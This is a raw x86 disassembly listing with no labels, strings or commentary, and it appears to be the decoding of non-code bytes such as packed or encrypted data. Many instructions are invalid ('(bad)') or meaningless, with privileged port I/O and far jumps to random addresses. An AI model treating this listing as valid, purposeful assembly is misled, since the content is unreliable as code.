  42c87b:	mov    cl,0x69
  42c87d:	pushf  
  42c87e:	sub    BYTE PTR [eax-0x73b7d249],cl
  42c884:	cs sti 
  42c886:	jmp    0x240c4407
  42c88b:	mov    eax,ds:0xa5e034a3
  42c890:	xchg   ebx,eax
  42c891:	cwde   
  42c892:	mov    DWORD PTR [ebx],eax
  42c894:	out    dx,eax
  42c895:	sub    al,0xba
  42c897:	push   edx
  42c898:	mov    eax,ds:0x90cc847f
  42c89d:	pop    edx
  42c89e:	mov    bl,0xbd
  42c8a0:	inc    esi
  42c8a1:	mov    ch,0xba
  42c8a3:	inc    ebx
  42c8a4:	cmp    al,0x9c
  42c8a6:	adc    DWORD PTR [ecx],0x7b9a8fe4
  42c8ac:	fiadd  WORD PTR [ebp+0x73]
  42c8af:	mov    al,0x9d
  42c8b1:	mov    edi,0x6350d707
  42c8b6:	out    0x9,eax
  42c8b8:	jne    0x42c8c6
  42c8ba:	push   es
  42c8bb:	sbb    bh,al
  42c8bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8be:	xchg   ebp,eax
  42c8bf:	add    DWORD PTR [edx+edi*4],0x41
  42c8c3:	push   cs
  42c8c4:	dec    ecx
  42c8c5:	call   0x74fc:0x9cb26db9
  42c8cc:	xchg   ebp,eax
  42c8cd:	mov    ds:0x20170893,al
  42c8d2:	cwde   
  42c8d3:	cmp    BYTE PTR [ecx+eax*4],ah
  42c8d6:	jb     0x42c8cc
  42c8d8:	in     al,dx
  42c8d9:	fld    QWORD PTR [eax-0x22]
  42c8dc:	adc    al,0x2
  42c8de:	(bad)  
  42c8df:	cli    
  42c8e0:	push   0xfffffffe
  42c8e2:	xchg   DWORD PTR [ecx+0x7066cf6c],esp
  42c8e8:	cmp    al,0xc7
  42c8ea:	in     al,0xa2
  42c8ec:	push   ebx
  42c8ed:	je     0x42c877
  42c8ef:	cld    
  42c8f0:	(bad)  
  42c8f1:	pop    ss
  42c8f2:	pop    ds
  42c8f3:	add    dl,BYTE PTR [edi+edi*1-0x6856aaf5]
  42c8fa:	jmp    0x4eb634e9
  42c8ff:	in     al,0x71
  42c901:	nop
  42c902:	(bad)  
  42c903:	mov    WORD PTR [ecx+0x3af77f12],?
  42c909:	inc    esp
  42c90a:	push   ecx
  42c90b:	lds    eax,FWORD PTR [esi]
  42c90d:	or     ebp,DWORD PTR ds:0x28e1
	...
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x703f4764
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0xcd000001,al
  42c98d:	test   al,0x74
  42c98f:	loopne 0x42c97c
  42c991:	xchg   ebx,eax
  42c992:	or     bh,bh
  42c994:	retf   0xf718
  42c997:	mov    bh,0x50
  42c999:	arpl   ax,sp
  42c99b:	outs   dx,DWORD PTR ds:[esi]
  42c99c:	jno    0x42c945
  42c99e:	test   ebp,eax
  42c9a0:	mov    ecx,0x1d922143
  42c9a5:	add    dl,dl
  42c9a7:	lea    esi,[ecx-0x5df1f74f]
  42c9ad:	hlt    
  42c9ae:	bnd jp 0x42c9a1
  42c9b1:	(bad)  
  42c9b3:	shl    al,0x3b
  42c9b6:	xlat   BYTE PTR ds:[ebx]
  42c9b7:	xor    eax,0x4ed272e
  42c9bc:	cwde   
  42c9bd:	int    0x5
  42c9bf:	jmp    DWORD PTR [ebx-0x15a24ef7]
  42c9c5:	ins    BYTE PTR es:[edi],dx
  42c9c6:	jp     0x42ca22
  42c9c8:	xchg   ebx,eax
  42c9c9:	inc    esp
  42c9ca:	mov    cl,0x28
  42c9cc:	arpl   WORD PTR [edi],bx
  42c9ce:	cli    
  42c9cf:	cwde   
  42c9d0:	lock jns 0x42c966
  42c9d3:	jle    0x42ca3a
  42c9d5:	inc    ebp
  42c9d6:	daa    
  42c9d7:	mov    BYTE PTR [eax+0x7d3057fb],dl
  42c9dd:	push   ebx
  42c9de:	or     BYTE PTR [eax+0x1657f53f],0x9d
  42c9e5:	iret   
  42c9e6:	fbld   TBYTE PTR [ecx+eiz*4-0x74]
  42c9ea:	mov    ah,0x29
  42c9ec:	or     dh,BYTE PTR [ebx+0x7344b5e]
  42c9f2:	pop    eax
  42c9f3:	cmp    dl,bl
  42c9f5:	jmp    0x9ca:0xfdbf3ed4
  42c9fc:	sbb    eax,ebp
  42c9fe:	repz mov ch,0x78
  42ca01:	sbb    ecx,esp
  42ca03:	out    dx,al
  42ca04:	loopne 0x42c987
  42ca06:	jmp    0xca9d9bad
  42ca0b:	mov    ch,0x77
  42ca0d:	pop    esi
  42ca0e:	xor    esp,DWORD PTR [edi+eiz*1-0x4b047d0d]
  42ca15:	pop    edi
  42ca16:	cld    
  42ca17:	(bad)  [ebp+0x54fa5a0f]
  42ca1e:	sub    ecx,DWORD PTR [esi+0xa499994]
  42ca24:	test   edx,0x2c43d747
  42ca2a:	add    al,0xda
  42ca2c:	sahf   
  42ca2d:	(bad)  
  42ca2e:	shl    DWORD PTR [eax+ecx*1-0x32],cl
  42ca32:	pop    ebp
  42ca33:	addr16 aaa 
  42ca35:	ja     0x42ca9a
  42ca37:	sbb    BYTE PTR [esi+0x6d775011],al
  42ca3d:	push   edx
  42ca3e:	mov    al,ds:0xc4159067
  42ca43:	xor    cl,bl
  42ca45:	test   BYTE PTR [edx+0x1de33c0b],cl
  42ca4b:	iret   
  42ca4c:	mov    al,0x71
  42ca4e:	leave  
  42ca4f:	pushf  
  42ca50:	jnp    0x42ca62
  42ca52:	jbe    0x42c9f6
  42ca54:	in     eax,dx
  42ca55:	jmp    0x583b:0xec6c40dd
  42ca5c:	and    ebp,DWORD PTR ss:[eax+ebp*1]
  42ca60:	bound  edx,QWORD PTR [eax]
  42ca62:	hlt    
  42ca63:	or     eax,DWORD PTR [edx-0x23]
  42ca66:	or     eax,0xf2a9502
  42ca6b:	fisub  WORD PTR [esi]
  42ca6d:	fld    QWORD PTR [ecx-0x67]
  42ca70:	and    al,0xc1
  42ca72:	push   edi
  42ca73:	adc    eax,DWORD PTR [edi+0x2d03fafc]
  42ca79:	jg     0x42caf6
  42ca7b:	clc    
  42ca7c:	sbb    esp,DWORD PTR [esi+0x41f566e8]
  42ca82:	repnz push edx
  42ca85:	mov    edi,0xd616e420
  42ca8a:	push   esp
  42ca8b:	popf   
  42ca8c:	fwait
  42ca8d:	bound  ebx,QWORD PTR ds:0x452f
	...
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0xa609140]
  42cb02:	lahf   
  42cb03:	add    eax,DWORD PTR [edi+ebx*8]
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0xdc000001
  42cb0d:	xchg   edi,eax
  42cb0e:	fcomp  st(2)
  42cb10:	and    dh,ah
  42cb12:	cld    
  42cb13:	mov    ecx,0xa53be19
  42cb18:	imul   edx,DWORD PTR [ecx-0x2a5a8f8e],0xfffffffe
  42cb1f:	fs jae 0x42cacd
  42cb22:	les    ebp,FWORD PTR [eax]
  42cb24:	xchg   ebx,eax
  42cb25:	hlt    
  42cb26:	dec    ebp
  42cb27:	scas   eax,DWORD PTR es:[edi]
  42cb28:	or     BYTE PTR [eax-0x1329e784],dl
  42cb2e:	sub    eax,0x6020de6
  42cb33:	sub    DWORD PTR [edx+0x6],ecx
  42cb36:	sti    
  42cb37:	or     ebp,DWORD PTR [eax+0xa20b37d]
  42cb3d:	out    0x78,eax
  42cb3f:	fild   WORD PTR [edi-0x4a]
  42cb42:	xchg   ebx,eax
  42cb43:	xor    cl,al
  42cb45:	(bad)  
  42cb46:	cmp    eax,0xbb8512d2
  42cb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb4c:	inc    esp
  42cb4d:	cs fsubr st,st(3)
  42cb50:	sar    BYTE PTR [edx+0x1f],cl
  42cb53:	xor    dl,BYTE PTR [eax-0x69938b7d]
  42cb59:	xor    ebx,edx
  42cb5b:	or     bl,ch
  42cb5d:	into   
  42cb5e:	mov    ah,0xa
  42cb60:	push   0xffffffda
  42cb62:	sbb    BYTE PTR [edx-0x7c3eb95a],bh
  42cb68:	dec    ebp
  42cb69:	push   edx
  42cb6a:	pop    ss
  42cb6b:	dec    ecx
  42cb6c:	test   eax,0x4826f26
  42cb71:	(bad)  
  42cb72:	loop   0x42cbd5
  42cb74:	or     ebp,DWORD PTR [ecx+esi*8]
  42cb77:	sbb    edi,eax
  42cb79:	mov    al,0x77
  42cb7b:	loope  0x42cbb0
  42cb7d:	add    DWORD PTR [ebp+0xc],0xc8dd550a
  42cb84:	and    eax,0xb5206d75
  42cb89:	mov    cl,0x43
  42cb8b:	dec    edi
  42cb8c:	(bad)  
  42cb8d:	jne    0x42cbbb
  42cb8f:	inc    esi
  42cb90:	mov    ds:0x846f47c0,eax
  42cb95:	jmp    0x14073734
  42cb9a:	ja     0x42cbf7
  42cb9c:	add    ax,0x8faf
  42cba0:	sbb    al,0x4a
  42cba2:	aaa    
  42cba3:	mov    ebx,0xe76110f8
  42cba8:	add    eax,0xffffffce
  42cbab:	adc    DWORD PTR [ecx+eiz*1],ecx
  42cbae:	sahf   
  42cbaf:	dec    ebp
  42cbb0:	shl    dl,cl
  42cbb2:	aam    0xb4
  42cbb4:	pop    ss
  42cbb5:	daa    
  42cbb6:	jle    0x42cbb9
  42cbb8:	ficom  WORD PTR [esi+0x7]
  42cbbb:	lahf   
  42cbbc:	ds sbb DWORD PTR es:[edx-0x4024b428],esp
  42cbc4:	xor    al,0xc6
  42cbc6:	xor    eax,DWORD PTR [edi-0x2d]
  42cbc9:	mov    edi,0xa20f8854
  42cbce:	adc    al,0x5f
  42cbd0:	retf   
  42cbd1:	mov    esp,0x44e6619a
  42cbd6:	add    cl,dl
  42cbd8:	rcl    DWORD PTR [bx+0x40fe],0x48
  42cbde:	cmp    al,0x8a
  42cbe0:	retf   
  42cbe1:	imul   esp,DWORD PTR [eax],0xa
  42cbe4:	add    al,0xe5
  42cbe6:	jl     0x42cc33
  42cbe8:	add    BYTE PTR [edi],bh
  42cbea:	div    BYTE PTR [ebx-0x4de098c9]
  42cbf0:	sub    DWORD PTR [edi],ebp
  42cbf2:	in     al,dx
  42cbf3:	ret    0x7223
  42cbf6:	jmp    0xf46ff429
  42cbfb:	or     BYTE PTR [ebx],ch
  42cbfd:	xor    DWORD PTR [ecx+0x1b],ebp
  42cc00:	add    BYTE PTR [ebp+edx*8-0x30],cl
  42cc04:	dec    edi
  42cc05:	jl     0x42cba5
  42cc07:	xor    al,0xa3
  42cc09:	jle    0x42cb9f
  42cc0b:	int    0x41
  42cc0d:	pop    ecx
  42cc0e:	cs inc edi
  42cc10:	scas   al,BYTE PTR es:[edi]
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x29854889
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0xe1000001
  42cc8d:	pop    esp
  42cc8e:	and    BYTE PTR ds:0x7fc51fd4,bl
  42cc94:	test   BYTE PTR [eax-0x1e86c1d1],al
  42cc9a:	adc    ebx,DWORD PTR [ecx+0x4a]
  42cc9d:	mov    ebp,0xe0a84743
  42cca2:	dec    edi
  42cca3:	xchg   edx,eax
  42cca4:	addr16 mov bh,0x3f
  42cca7:	push   esi
  42cca8:	loope  0x42cce2
  42ccaa:	sbb    al,0xe8
  42ccac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ccad:	sub    DWORD PTR [esi*8+0x6f99451e],0xfb398033
  42ccb8:	test   ebp,edi
  42ccba:	inc    ecx
  42ccbb:	push   ss
  42ccbc:	les    edx,FWORD PTR [esi]
  42ccbe:	popa   
  42ccbf:	lods   eax,DWORD PTR ds:[esi]
  42ccc0:	add    DWORD PTR [ecx],0x6f
  42ccc3:	or     BYTE PTR [esi],bl
  42ccc5:	mov    DWORD PTR [edi+0x68],esp
  42ccc8:	int3   
  42ccc9:	xchg   edi,edi
  42cccb:	int3   
  42cccc:	outs   dx,BYTE PTR ss:[esi]
  42ccce:	dec    eax
  42cccf:	mov    bl,0x7f
  42ccd1:	outs   dx,DWORD PTR ds:[esi]
  42ccd2:	scas   al,BYTE PTR es:[edi]
  42ccd3:	popa   
  42ccd4:	or     ah,BYTE PTR [ebx-0x53]
  42ccd7:	push   cs
  42ccd8:	fnstcw WORD PTR ds:0x12328700
  42ccde:	mov    edi,0x6347a02f
  42cce3:	cmc    
  42cce4:	sbb    bh,0x92
  42cce7:	sub    esp,DWORD PTR [edi+0x3d8ad029]
  42cced:	nop
  42ccee:	xlat   BYTE PTR ds:[ebx]
  42ccef:	sbb    al,0xb4
  42ccf1:	and    eax,0x7c5316e7
  42ccf6:	pop    ecx
  42ccf7:	fsubr  st(5),st
  42ccf9:	loopne 0x42cc9a
  42ccfb:	jo     0x42ccf4
  42ccfd:	or     al,0x7c
  42ccff:	mov    esp,0xefef5e90
  42cd04:	lods   eax,DWORD PTR ds:[esi]
  42cd05:	xor    al,0x99
  42cd07:	dec    esp
  42cd08:	dec    ebx
  42cd09:	(bad)  
  42cd0b:	dec    ecx
  42cd0c:	mov    DWORD PTR [esi+0x16fb2e68],ecx
  42cd12:	xchg   edx,eax
  42cd13:	outs   dx,BYTE PTR ds:[esi]
  42cd14:	iret   
  42cd15:	test   al,0x5d
  42cd17:	push   ebp
  42cd18:	mov    al,BYTE PTR fs:[ebp+0x5d322bb7]
  42cd1f:	pop    es
  42cd20:	add    dh,BYTE PTR [ebx-0x44]
  42cd23:	mov    dh,0x56
  42cd25:	dec    DWORD PTR [ecx-0x702124ce]
  42cd2b:	cld    
  42cd2c:	mov    ds:0x8f68aa2a,eax
  42cd31:	je     0x42cd5d
  42cd33:	cmp    al,0xb5
  42cd35:	mov    eax,ds:0xee13baa9
  42cd3a:	stc    
  42cd3b:	push   ecx
  42cd3c:	jle    0x42cda1
  42cd3e:	or     eax,0x34aa9cee
  42cd43:	leave  
  42cd44:	hlt    
  42cd45:	push   ds
  42cd46:	jnp    0x42cd15
  42cd48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd49:	jbe    0x42ccd9
  42cd4b:	mov    ds:0x509d661d,al
  42cd50:	popa   
  42cd51:	jl     0x42cceb
  42cd53:	pop    ds
  42cd54:	mul    DWORD PTR [eax-0x32]
  42cd57:	mov    ebx,0x47a439ac
  42cd5c:	xor    al,BYTE PTR [esi]
  42cd5e:	and    dh,ch
  42cd60:	dec    edi
  42cd61:	mov    cl,0xc1
  42cd63:	cli    
  42cd64:	fimul  DWORD PTR [ebx]
  42cd66:	sahf   
  42cd67:	pop    ebp
  42cd68:	push   cs
  42cd69:	jecxz  0x42cde7
  42cd6b:	call   0x4664:0x21a66dd0
  42cd72:	mov    ah,0xa6
  42cd74:	sti    
  42cd75:	stos   BYTE PTR es:[edi],al
  42cd76:	or     edi,DWORD PTR [edx+0x62ce63ac]
  42cd7c:	jp     0x42cd7e
  42cd7e:	fisubr WORD PTR [ecx]
  42cd80:	(bad)  
  42cd81:	mov    ds:0x98ba0cad,eax
  42cd86:	mov    ecx,0x9d36b14c
  42cd8b:	adc    ecx,edi
  42cd8d:	dec    ebx
  42cd8e:	jle    0x42cd57
  42cd90:	jns    0x42cd92
	...
  42cdf2:	add    BYTE PTR [eax],al
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x82
  42ce01:	mov    ch,0x14
  42ce03:	pushw  cs
  42ce05:	loope  0x42ce08
  42ce07:	add    BYTE PTR ds:0x7000001,al
  42ce0d:	pop    ecx
  42ce0e:	mov    esi,0xb87b36a3
  42ce13:	outs   dx,BYTE PTR ds:[esi]
  42ce14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce15:	imul   esi,DWORD PTR [esi-0x2b],0x995c655d
  42ce1c:	in     eax,dx
  42ce1d:	jg     0x42cdb6
  42ce1f:	pop    ss
  42ce20:	mov    dh,0x31
  42ce22:	rcl    DWORD PTR [esi-0x14],0xb8
  42ce26:	into   
  42ce27:	pop    edx
  42ce28:	test   al,0xd6
  42ce2a:	and    DWORD PTR [eax+0x47898176],ecx
  42ce30:	imul   ebp,DWORD PTR [ecx+0x2d62331],0x89912e3a
  42ce3a:	loopne 0x42cde8
  42ce3c:	daa    
  42ce3d:	in     eax,dx
  42ce3e:	out    dx,al
  42ce3f:	sbb    DWORD PTR [edi-0x1701ce1a],ebp
  42ce45:	mov    eax,ds:0xdd5a43b0
  42ce4a:	scas   eax,DWORD PTR es:[edi]
  42ce4b:	adc    al,bh
  42ce4d:	(bad)  
  42ce4e:	stos   DWORD PTR es:[edi],eax
  42ce4f:	push   0x3aa7ee47
  42ce54:	ds ja  0x42ce4a
  42ce57:	jmp    0x80a7:0x5e0033bc
  42ce5e:	xchg   esp,eax
  42ce5f:	mov    eax,DWORD PTR [eax+ebx*1]
  42ce62:	daa    
  42ce63:	cmp    dh,BYTE PTR [ecx]
  42ce65:	mov    edx,0xe44a491d
  42ce6a:	xchg   ebp,edx
  42ce6c:	pushf  
  42ce6d:	sbb    dl,BYTE PTR [edi]
  42ce6f:	je     0x42ce7c
  42ce71:	dec    ecx
  42ce72:	lods   al,BYTE PTR ds:[esi]
  42ce73:	mov    ebx,0xd8a46a72
  42ce78:	inc    esi
  42ce79:	retf   
  42ce7a:	or     edi,DWORD PTR [ecx]
  42ce7c:	cmp    BYTE PTR [edi],0x75
  42ce7f:	stos   BYTE PTR es:[edi],al
  42ce80:	or     al,0x40
  42ce82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce83:	nop
  42ce84:	cdq    
  42ce85:	cmp    eax,0x4238b59a
  42ce8a:	cmp    al,0x12
  42ce8c:	jae    0x42ceb0
  42ce8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce8f:	dec    ecx
  42ce90:	lock xchg esp,eax
  42ce92:	push   edx
  42ce93:	stos   BYTE PTR es:[edi],al
  42ce94:	push   edi
  42ce95:	inc    DWORD PTR [ecx+eax*2]
  42ce98:	xchg   edi,eax
  42ce99:	inc    edx
  42ce9a:	into   
  42ce9b:	cdq    
  42ce9c:	cs push es
  42ce9e:	inc    ebx
  42ce9f:	sub    dh,bh
  42cea1:	adc    cl,BYTE PTR [ebx+0x4c0e8873]
  42cea7:	repz sti 
  42cea9:	jmp    0x42cf23
  42ceab:	ss push 0x49
  42ceae:	jg     0x42ce66
  42ceb0:	adc    eax,0xb2421d4c
  42ceb5:	pop    ds
  42ceb6:	mov    edx,0x95d3cb17
  42cebb:	cmp    dl,BYTE PTR [ebx-0x73e1da74]
  42cec1:	inc    ebx
  42cec2:	or     ebp,DWORD PTR [edi]
  42cec4:	add    BYTE PTR [edx-0x2],al
  42cec7:	push   0x75edde01
  42cecc:	ja     0x42ce50
  42cece:	mov    ebx,0xb8a425cd
  42ced3:	mul    dl
  42ced5:	or     DWORD PTR [ebx],0xf3734dc3
  42cedb:	and    eax,edi
  42cedd:	shr    ecx,1
  42cedf:	add    edi,DWORD PTR [ecx-0x4b]
  42cee2:	aas    
  42cee3:	fnstcw WORD PTR [ecx]
  42cee5:	inc    ecx
  42cee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cee7:	sub    al,BYTE PTR [ecx+0x3d8a4167]
  42ceed:	enter  0x2f48,0x15
  42cef1:	inc    ecx
  42cef2:	inc    ecx
  42cef3:	sub    al,0x3d
  42cef5:	clc    
  42cef6:	aad    0x27
  42cef8:	add    al,0xf4
  42cefa:	gs inc edx
  42cefc:	jl     0x42ce8d
  42cefe:	cdq    
  42ceff:	into   
  42cf00:	push   0x2445d786
  42cf05:	pop    ecx
  42cf06:	inc    ebp
  42cf07:	push   edx
  42cf08:	add    ebp,DWORD PTR [ebx-0x76768131]
  42cf0e:	call   0x43586b
	...
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    eax,FWORD PTR [ebp+ecx*8+0xf]
  42cf83:	jl     0x42cf98
  42cf85:	loop   0x42cf88
  42cf87:	add    BYTE PTR ds:0xe5000001,al
  42cf8d:	cmc    
  42cf8e:	xchg   ebp,eax
  42cf8f:	push   0x6
  42cf91:	sahf   
  42cf92:	test   al,0xb9
  42cf94:	dec    ebp
  42cf95:	dec    ebx
  42cf96:	add    eax,0x45ac57cf
  42cf9b:	and    eax,0x924550be
  42cfa0:	stc    
  42cfa1:	mov    bh,0x3a
  42cfa3:	(bad)  
  42cfa4:	loope  0x42cf6e
  42cfa6:	xor    DWORD PTR [edi],esi
  42cfa8:	hlt    
  42cfa9:	test   al,0xa8
  42cfab:	jns    0x42cf5a
  42cfad:	or     eax,0x574ba92c
  42cfb2:	fs ja  0x42cfc7
  42cfb5:	retf   
  42cfb6:	mov    eax,ds:0xbcbe20bc
  42cfbb:	cmp    ch,dl
  42cfbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cfbe:	mov    edx,0xe5834eeb
  42cfc3:	test   al,0xba
  42cfc5:	cmp    al,BYTE PTR [ebp-0x5a]
  42cfc8:	xor    BYTE PTR es:[eax],al
  42cfcb:	int    0xb3
  42cfcd:	call   0x5597:0x21f3ce71
  42cfd4:	fldcw  WORD PTR [ebx+esi*4]
  42cfd7:	mov    ecx,0x3f95598a
  42cfdc:	daa    
  42cfdd:	sbb    eax,DWORD PTR [esp+ebp*1]
  42cfe0:	in     eax,0xd0
  42cfe2:	jne    0x42cfcb
  42cfe4:	xchg   DWORD PTR [edx-0x12],ecx
  42cfe7:	mov    ah,0xdd
  42cfe9:	in     eax,dx
  42cfea:	ret    
  42cfeb:	or     DWORD PTR [ebp-0x721adc65],esp
  42cff1:	lea    edx,[esi-0x2]
  42cff4:	mov    esp,0x77b98d59
  42cff9:	adc    dl,cl
  42cffb:	nop
  42cffc:	ret    0xe914
  42cfff:	push   ebp
  42d000:	lods   eax,DWORD PTR ds:[esi]
  42d001:	pop    ss
  42d002:	call   0x7655ab08
  42d007:	add    edx,DWORD PTR [ebp-0x73]
  42d00a:	(bad)  
  42d00b:	pop    eax
  42d00c:	(bad)  
  42d00d:	fild   QWORD PTR [edi-0x766eedef]
  42d013:	adc    dl,0x83
  42d016:	adc    eax,0x25f59327
  42d01b:	inc    BYTE PTR [edi-0x36]
  42d01e:	push   cs
  42d01f:	xor    cl,BYTE PTR [edi]
  42d021:	mov    DWORD PTR [esi-0x7d],eax
  42d024:	call   0xc3ce:0x8cee04d7
  42d02b:	in     eax,0x16
  42d02d:	outs   dx,BYTE PTR ds:[esi]
  42d02e:	les    esp,FWORD PTR [ebp+ebp*8+0x4e59501e]
  42d035:	dec    ebx
  42d036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d037:	int    0xc2
  42d039:	sbb    al,BYTE PTR [esi-0x77]
  42d03c:	or     BYTE PTR [eax+0x5],cl
  42d03f:	lods   al,BYTE PTR ds:[esi]
  42d040:	jle    0x42cfe3
  42d042:	into   
  42d043:	into   
  42d044:	lods   eax,DWORD PTR ds:[esi]
  42d045:	inc    esi
  42d046:	mov    ecx,0xa271ba9c
  42d04b:	push   ss
  42d04c:	call   0xbe13:0xb2ffcdda
  42d053:	(bad)  
  42d054:	jg     0x42d025
  42d056:	push   esi
  42d057:	out    dx,eax
  42d058:	dec    esi
  42d059:	fcmove st,st(5)
  42d05b:	shl    ah,cl
  42d05d:	cmp    eax,0x34613fee
  42d062:	(bad)  [edx]
  42d064:	out    0xce,eax
  42d066:	fisub  WORD PTR [edi]
  42d068:	and    BYTE PTR ds:0x740ca86f,bl
  42d06e:	inc    eax
  42d06f:	jbe    0x42d098
  42d071:	pop    ss
  42d072:	call   0x2d53c253
  42d077:	jmp    0x1705b2e9
  42d07c:	daa    
  42d07d:	jle    0x42d0d8
  42d07f:	addr16 sub eax,0x5ae00f15
  42d085:	dec    ebp
  42d086:	sbb    esi,eax
  42d088:	call   0xeba9:0x27b043
  42d08f:	push   0x38
	...
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [eax-0xb],ch
  42d102:	sar    BYTE PTR [edi],1
  42d104:	sbb    bl,ah
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    eax,0x67000001
  42d10d:	cmc    
  42d10e:	int3   
  42d10f:	test   eax,0xe27a0fe4
  42d114:	scas   eax,DWORD PTR es:[edi]
  42d115:	or     BYTE PTR [ecx],dl
  42d117:	push   edi
  42d118:	mov    ds:0xedf60ede,al
  42d11d:	push   ebx
  42d11e:	pusha  
  42d11f:	push   eax
  42d120:	dec    ebp
  42d121:	push   es
  42d122:	ja     0x42d0a6
  42d124:	mov    al,0x13
  42d126:	and    ebp,DWORD PTR [esi]
  42d128:	das    
  42d129:	jg     0x42d16f
  42d12b:	or     ebx,DWORD PTR [eax+0x3b8d91b1]
  42d131:	mov    edx,0x898ce6f1
  42d136:	in     eax,0x7b
  42d138:	fstp   QWORD PTR [edi+0x6b]
  42d13b:	enter  0x5ab7,0x55
  42d13f:	push   cs
  42d140:	lock test al,0xc6
  42d143:	idiv   DWORD PTR [edi+0x3]
  42d146:	in     eax,dx
  42d147:	inc    edi
  42d148:	jno    0x42d12f
  42d14a:	cmp    DWORD PTR [esi],ebp
  42d14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d14d:	stc    
  42d14e:	and    esi,DWORD PTR [eax]
  42d150:	in     eax,0x7b
  42d152:	(bad)  
  42d153:	jmp    0xea7b:0x53a13b6d
  42d15a:	cwde   
  42d15b:	outs   dx,BYTE PTR ds:[esi]
  42d15c:	mov    esp,0x3a533b6a
  42d161:	or     eax,0x5e67a6bc
  42d166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d167:	std    
  42d168:	jmp    DWORD PTR [edi-0x1b7979bd]
  42d16e:	xor    BYTE PTR [ebx-0x6a],cl
  42d171:	fcmovnbe st,st(1)
  42d173:	frstor [esi+0x1847aa2c]
  42d179:	imul   ebx,DWORD PTR [ebp-0x17ed250f],0x5f
  42d180:	test   ebp,ecx
  42d182:	dec    esp
  42d183:	in     eax,0x9b
  42d185:	dec    ebx
  42d186:	rcr    BYTE PTR [ebx+esi*8+0x13],cl
  42d18a:	dec    ecx
  42d18b:	mov    ch,0x80
  42d18d:	jecxz  0x42d14b
  42d18f:	jg     0x42d195
  42d191:	sti    
  42d192:	xchg   DWORD PTR [ebx+0x19],ebx
  42d195:	inc    esp
  42d196:	(bad)  
  42d197:	cdq    
  42d198:	mov    ds:0xeff52572,eax
  42d19d:	nop
  42d19e:	adc    DWORD PTR [edx+0x74b53c7c],0x21
  42d1a5:	addr16 pushf 
  42d1a7:	test   al,0x83
  42d1a9:	push   ecx
  42d1aa:	ficomp DWORD PTR [ebp-0x3cca87ef]
  42d1b0:	in     al,dx
  42d1b1:	mov    BYTE PTR [edx],bl
  42d1b3:	fucomi st,st(4)
  42d1b5:	rcr    DWORD PTR es:[ecx],cl
  42d1b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1b9:	dec    ebx
  42d1ba:	cmp    al,0xbe
  42d1bc:	xor    eax,edi
  42d1be:	inc    ebx
  42d1bf:	xchg   esi,eax
  42d1c0:	fdivr  st(4),st
  42d1c2:	xchg   edx,eax
  42d1c3:	ins    DWORD PTR es:[edi],dx
  42d1c4:	pushf  
  42d1c5:	cmp    al,0x7b
  42d1c7:	out    dx,al
  42d1c8:	cli    
  42d1c9:	out    dx,eax
  42d1ca:	daa    
  42d1cb:	mov    tr6,esi
  42d1ce:	add    BYTE PTR [ebp-0x5c],dl
  42d1d1:	inc    edi
  42d1d2:	nop
  42d1d3:	sahf   
  42d1d4:	pop    esi
  42d1d5:	sub    esp,esp
  42d1d7:	pop    edi
  42d1d8:	sbb    eax,0xbfff79ea
  42d1dd:	cmp    eax,0x63a763f5
  42d1e2:	imul   esp,DWORD PTR [esi],0x14
  42d1e5:	or     DWORD PTR [edx+ebx*4],edx
  42d1e8:	xlat   BYTE PTR ds:[ebx]
  42d1e9:	xchg   ebx,eax
  42d1ea:	call   0xba3430ea
  42d1ef:	dec    esi
  42d1f0:	das    
  42d1f1:	ss in  eax,0xb5
  42d1f4:	int3   
  42d1f5:	push   ds
  42d1f6:	sbb    DWORD PTR [ebx+0x29],0x840781db
  42d1fd:	jns    0x42d242
  42d1ff:	xchg   ebx,eax
  42d200:	sub    al,BYTE PTR [eax]
  42d202:	fbld   TBYTE PTR cs:[ecx-0x2b]
  42d206:	push   esi
  42d207:	clc    
  42d208:	cmp    edi,esp
  42d20a:	pusha  
  42d20b:	jae    0x42d25d
  42d20d:	xchg   edi,eax
  42d20e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d20f:	retf   
